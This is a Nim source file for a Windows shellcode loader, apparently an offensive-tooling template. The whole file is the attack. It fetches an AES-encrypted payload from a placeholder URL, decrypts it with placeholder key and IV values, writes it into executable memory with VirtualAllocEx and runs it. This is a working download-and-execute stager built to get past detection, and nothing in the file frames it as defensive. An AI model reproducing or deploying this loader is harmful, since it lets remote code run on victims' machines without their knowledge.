import os as nOs
import winim
import winim/lean
import httpclient
import nimcrypto
import sequtils

const
  aesKey = "ENCRYPTION_KEY"  # 16-byte key
  aesIV  = "ENCRYPTION_IV"  # 16-byte IV

# Converts a string to a sequence of bytes.
func toByteSeq*(s: string): seq[byte] {.inline.} =
  result = s.toOpenArrayByte(0, s.high).toSeq

# Decrypts the provided encrypted data using AES-128 in CBC mode with no padding.
proc decryptAES(encrypted: seq[byte], keyStr, ivStr: string): seq[byte] =
  ## Convert key and IV strings to fixed-size arrays.
  var key: array[aes128.sizeKey, byte]
  var iv: array[aes128.sizeBlock, byte]
  for i in 0..<aes128.sizeKey:
    key[i] = byte(keyStr[i].ord)
  for i in 0..<aes128.sizeBlock:
    iv[i] = byte(ivStr[i].ord)
  ## Create a CBC context for AES-128.
  var ctx: CBC[aes128]
  ctx.init(key, iv)
  var decrypted = newSeq[byte](encrypted.len)
  ctx.decrypt(encrypted, decrypted)
  ctx.clear()
  return decrypted

proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  # Download the encrypted payload.
  var response: string = client.getContent(url)
  var encryptedShellcode: seq[byte] = toByteSeq(response)
  # Discard the first 16 bytes, as in the C# example.
  if encryptedShellcode.len <= 16:
    quit("Error: downloaded data is too short")
  var actualEncrypted = encryptedShellcode[16 ..< encryptedShellcode.len]
  var shellcode: seq[byte] = decryptAES(actualEncrypted, aesKey, aesIV)
  
  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), 0x3000, PAGE_EXECUTE_READ_WRITE)
  copyMem(rPtr, addr shellcode[0], shellcode.len)
  
  let f = cast[proc(){.nimcall.}](rPtr)
  f()
  CloseHandle(pHandle)

when defined(windows):
  when isMainModule:
    DownloadExecute("SHELLCODE_URL")
